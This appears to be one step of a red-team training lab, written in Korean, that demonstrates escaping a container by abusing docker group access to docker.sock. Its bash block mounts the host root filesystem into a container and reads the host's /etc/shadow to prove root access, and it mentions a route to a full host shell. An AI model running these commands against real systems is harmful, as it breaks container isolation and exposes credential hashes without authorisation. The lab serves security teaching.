  - order: 4
    instruction: |
      ## 🎯 MISSION (Red Team — docker.sock escape)

      STEP 2 의 2번 벡터(docker 그룹 + docker.sock)를 활용해 컨테이너를 탈출하고 호스트
      파일시스템에 root 로 접근함을 입증하라. ccc 는 docker 그룹이므로 docker 명령으로
      privileged 작업이 가능하다.

      ## 💻 실행 명령

      ```bash
      ssh 6v6-bastion '
      echo "=== docker.sock 접근 (docker 그룹) ==="
      docker ps --format "{{.Names}}" | head -3
      echo "=== escape PoC — host / 를 컨테이너에 마운트 후 host 파일 read ==="
      docker run --rm -v /:/host alpine cat /host/etc/hostname
      echo "=== host root 입증 — host /etc/shadow 첫 줄 ==="
      docker run --rm -v /:/host alpine head -1 /host/etc/shadow
      '
      ```

      ## 📋 확인 사항

      - docker ps 성공 = docker.sock 제어 가능 (docker 그룹)
      - `cat /host/etc/hostname` → host 의 hostname 출력 = 컨테이너 탈출 성공
      - `head /host/etc/shadow` → host 의 shadow read = host root 권한 입증

      ## 💡 왜 이걸 하는가?

      docker.sock 은 root 와 동등한 권한이다. docker 그룹 사용자는 `docker run -v /:/host`
      로 호스트 전체 파일시스템을 컨테이너에 마운트해 읽고 쓸 수 있다 (= host root). 이는
      privileged 컨테이너나 chroot 없이도 host 를 장악하는 강력한 벡터다. GTFOBins 와
      달리 SUID/sudo 가 필요 없다.

      ## 🔍 결과 해석

      - host hostname/shadow read 성공 = 컨테이너 격리 무력화 = host root 장악
      - `--privileged` 또는 `chroot /host` 로 완전한 host shell 도 가능 (본 실습은 read 입증)
      - 이것이 컨테이너 환경의 가장 위험한 구성 약점 중 하나

      ## ⚠️ 비정상 시 대응

      - docker: permission denied — ccc 가 docker 그룹 아님, `id | grep docker` 확인
      - docker.sock 없음 — `ls -la /var/run/docker.sock` (마운트 안 됐으면 escape 불가)
      - alpine pull 실패 — 폐쇄망, 이미 받은 이미지(`docker images`) 사용
    hint: |
      docker.sock escape — docker run -v /:/host alpine cat /host/etc/hostname(탈출)
      + head /host/etc/shadow(host root 입증). docker 그룹=root 동등, SUID/sudo 불필요.
    category: exploit
